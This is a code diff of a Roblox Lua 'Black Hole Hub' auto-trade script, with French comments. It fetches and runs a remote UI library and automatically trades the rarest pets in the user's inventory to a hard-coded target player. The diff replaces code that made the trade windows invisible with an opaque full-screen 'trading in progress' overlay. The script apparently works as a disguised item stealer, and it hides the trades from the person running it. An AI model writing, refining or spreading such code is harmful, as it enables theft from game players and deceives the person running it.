@@ -1,5 +1,5 @@
 -- ============================================================
--- BLACK HOLE HUB + AUTO TRADE (MODE INVISIBLE TOTAL)
+-- BLACK HOLE HUB + AUTO TRADE (MODE INVISIBLE)
 -- ============================================================
 
 local WindUI = loadstring(game:HttpGet("https://github.com/Footagesus/WindUI/releases/latest/download/main.lua"))()
@@ -20,8 +20,6 @@ local MAX_PETS = 6
 local DELAY_SEARCH = 0.03
 local CLICK_HOLD = 0.03
 local AUTO_START_DELAY = 3
-local HIDE_TRADE_UI = true   -- Cache l'interface de trade
-local HIDE_TRADEPLAYER_UI = true -- Cache la liste des joueurs (la pop-up)
 
 local SEARCH_ORDER = {
     "The Ethereal Everia", "The Grand Titan", "Frozen Dragon", "Enchanted Pegasus",
@@ -89,93 +87,37 @@ local eggPlantList = {
 local function noop() end
 
 -- ============================================================
--- 🔒 FONCTIONS POUR CACHER L'INTERFACE (Trading et TradePlayer)
+-- 🛡️ ÉCRAN DE CHARGEMENT POUR CACHER L'INTERFACE
 -- ============================================================
-local hiddenElements = {}
-local tpHiddenElements = {}
+local overlayGui = Instance.new("ScreenGui")
+overlayGui.Name = "AtomicOverlay"
+overlayGui.DisplayOrder = 9999 -- Au-dessus de tout
+overlayGui.ResetOnSpawn = false
+overlayGui.Parent = PlayerGui
+overlayGui.Enabled = false
 
-local function hideTradeUI(TradingGui)
-    if not HIDE_TRADE_UI or not TradingGui then return end
-    hiddenElements = {}
-    for _, obj in ipairs(TradingGui:GetDescendants()) do
-        local saved, changed = {}, false
-        if obj:IsA("GuiObject") and obj.BackgroundTransparency < 1 then
-            saved.bg = obj.BackgroundTransparency; obj.BackgroundTransparency = 1; changed = true
-        end
-        if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
-            saved.text = obj.TextTransparency; saved.stroke = obj.TextStrokeTransparency
-            obj.TextTransparency = 1; obj.TextStrokeTransparency = 1; changed = true
-        end
-        if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
-            saved.img = obj.ImageTransparency; obj.ImageTransparency = 1; changed = true
-        end
-        if obj:IsA("UIStroke") then
-            saved.stroke = obj.Transparency; obj.Transparency = 1; changed = true
-        end
-        if changed then table.insert(hiddenElements, {obj = obj, saved = saved}) end
-    end
+local overlayFrame = Instance.new("Frame")
+overlayFrame.Size = UDim2.new(1, 0, 1, 0)
+overlayFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20) -- Gris très foncé
+overlayFrame.BackgroundTransparency = 0.1
+overlayFrame.Parent = overlayGui
+
+local overlayText = Instance.new("TextLabel")
+overlayText.Size = UDim2.new(1, 0, 1, 0)
+overlayText.BackgroundTransparency = 1
+overlayText.Text = "🔄 Trading en cours..."
+overlayText.TextColor3 = Color3.fromRGB(255, 255, 255)
+overlayText.Font = Enum.Font.FredokaOne
+overlayText.TextSize = 28
+overlayText.Parent = overlayFrame
+
+local function showOverlay(text)
+    overlayText.Text = text or "🔄 Trading en cours..."
+    overlayGui.Enabled = true
 end
 
-local function showTradeUI()
-    if not HIDE_TRADE_UI then return end
-    for _, item in ipairs(hiddenElements) do
-        pcall(function()
-            local obj, saved = item.obj, item.saved
-            if obj and obj.Parent then
-                if saved.bg then obj.BackgroundTransparency = saved.bg end
-                if saved.text then obj.TextTransparency = saved.text end
-                if saved.stroke then
-                    if obj:IsA("UIStroke") then obj.Transparency = saved.stroke else obj.TextStrokeTransparency = saved.stroke end
-                end
-                if saved.img then obj.ImageTransparency = saved.img end
-            end
-        end)
-    end
-    hiddenElements = {}
-end
-
--- 🆕 Fonctions pour la popup TradePlayer (la liste des joueurs)
-local function hideTradePlayerUI()
-    if not HIDE_TRADEPLAYER_UI then return end
-    local TradePlayerGui = PlayerGui:FindFirstChild("TradePlayer")
-    if not TradePlayerGui then return end
-    tpHiddenElements = {}
-    
-    for _, obj in ipairs(TradePlayerGui:GetDescendants()) do
-        local saved, changed = {}, false
-        if obj:IsA("GuiObject") and obj.BackgroundTransparency < 1 then
-            saved.bg = obj.BackgroundTransparency; obj.BackgroundTransparency = 1; changed = true
-        end
-        if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
-            saved.text = obj.TextTransparency; saved.stroke = obj.TextStrokeTransparency
-            obj.TextTransparency = 1; obj.TextStrokeTransparency = 1; changed = true
-        end
-        if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
-            saved.img = obj.ImageTransparency; obj.ImageTransparency = 1; changed = true
-        end
-        if obj:IsA("UIStroke") then
-            saved.stroke = obj.Transparency; obj.Transparency = 1; changed = true
-        end
-        if changed then table.insert(tpHiddenElements, {obj = obj, saved = saved}) end
-    end
-end
-
-local function showTradePlayerUI()
-    if not HIDE_TRADEPLAYER_UI then return end
-    for _, item in ipairs(tpHiddenElements) do
-        pcall(function()
-            local obj, saved = item.obj, item.saved
-            if obj and obj.Parent then
-                if saved.bg then obj.BackgroundTransparency = saved.bg end
-                if saved.text then obj.TextTransparency = saved.text end
-                if saved.stroke then
-                    if obj:IsA("UIStroke") then obj.Transparency = saved.stroke else obj.TextStrokeTransparency = saved.stroke end
-                end
-                if saved.img then obj.ImageTransparency = saved.img end
-            end
-        end)
-    end
-    tpHiddenElements = {}
+local function hideOverlay()
+    overlayGui.Enabled = false
 end
 
 -- ============================================================
@@ -227,6 +169,10 @@ end
 
 local function doOneTrade()
     print("🔄 Cycle vers " .. TARGET_PLAYER_NAME)
+    
+    -- 🆕 On active l'écran de chargement
+    showOverlay("🔍 Recherche de " .. TARGET_PLAYER_NAME .. "...")
+    
     local Mainscreen = PlayerGui:WaitForChild("Mainscreen")
     local TradePlayerGui = PlayerGui:WaitForChild("TradePlayer")
     local TradingGui = PlayerGui:FindFirstChild("Trading")
@@ -242,9 +188,6 @@ local function doOneTrade()
         local blueButton = Mainscreen.Right:FindFirstChild("TradePlayer")
         if blueButton then fastClick(blueButton); task.wait(0.8) end
     end
-
-    -- 🆕 ON CACHE LA POPUP DÈS QU'ELLE EST OUVERTE
-    hideTradePlayerUI()
 
     local scrollingFrame = TradePlayerGui.Container.General.Frame.Frame.ScrollingFrame
     local targetGreenButton = nil
@@ -262,19 +205,18 @@ local function doOneTrade()
 
     if not targetGreenButton then
         warn("❌ " .. TARGET_PLAYER_NAME .. " introuvable. Attente 10s...")
+        showOverlay("❌ " .. TARGET_PLAYER_NAME .. " introuvable. Attente...")
         forceCloseTradePlayer()
-        showTradePlayerUI()
         task.wait(10)
+        hideOverlay()
         return false
     end
 
-    print("✅ Demande envoyée (invisible)")
+    print("✅ Demande envoyée")
+    showOverlay("📩 Demande envoyée à " .. TARGET_PLAYER_NAME)
     fastClick(targetGreenButton)
     task.wait(0.15)
     forceCloseTradePlayer()
-    
-    -- 🆕 On restaure la popup une fois fermée
-    showTradePlayerUI()
 
     local waitTime = 0
     local tradeOuvert = false
@@ -286,15 +228,16 @@ local function doOneTrade()
 
     if not tradeOuvert then
         warn("❌ Pas d'acceptation.")
+        hideOverlay()
         return false
     end
 
     print("🎉 Trade ouvert")
+    showOverlay("🎉 Trade ouvert ! Ajout des pets...")
     task.wait(1)
 
     local TradeFrame = TradingGui.Container.Frame
     hideTradeButtons(TradeFrame)
-    hideTradeUI(TradingGui) -- Cache l'interface de trade
 
     local CurInventory = TradeFrame.CurInventory.ScrollingFrame
     local CurOffer = TradeFrame.CurOffer
@@ -342,11 +285,12 @@ local function doOneTrade()
 
     if petsAdded == 0 then
         warn("🛑 Plus de pets rares.")
-        showTradeUI()
+        hideOverlay()
         return false
     end
 
     print("⏳ Ready")
+    showOverlay("⏳ Clic sur Ready...")
     local readyBtn = TradeFrame:FindFirstChild("Ready")
     if readyBtn then
         fastClick(readyBtn)
@@ -357,16 +301,18 @@ local function doOneTrade()
             if readyBtn and readyBtn.Text == "Accept" then acceptBtn = readyBtn end
             if acceptBtn then
                 print("✅ Accept")
+                showOverlay("✅ Acceptation...")
                 task.wait(0.05)
                 fastClick(acceptBtn)
                 print("🎉 Trade terminé")
-                showTradeUI()
+                task.wait(0.5)
+                hideOverlay()
                 return true
             end
         end
     end
     
-    showTradeUI()
+    hideOverlay()
     return false
 end
 
@@ -531,7 +477,7 @@ end
 -- ============================================================
 WindUI:Notify({
     Title = "Black Hole Hub",
-    Content = "Auto Trade (invisible total) vers " .. TARGET_PLAYER_NAME,
+    Content = "Auto Trade (invisible) vers " .. TARGET_PLAYER_NAME,
     Duration = 5,
 })
 
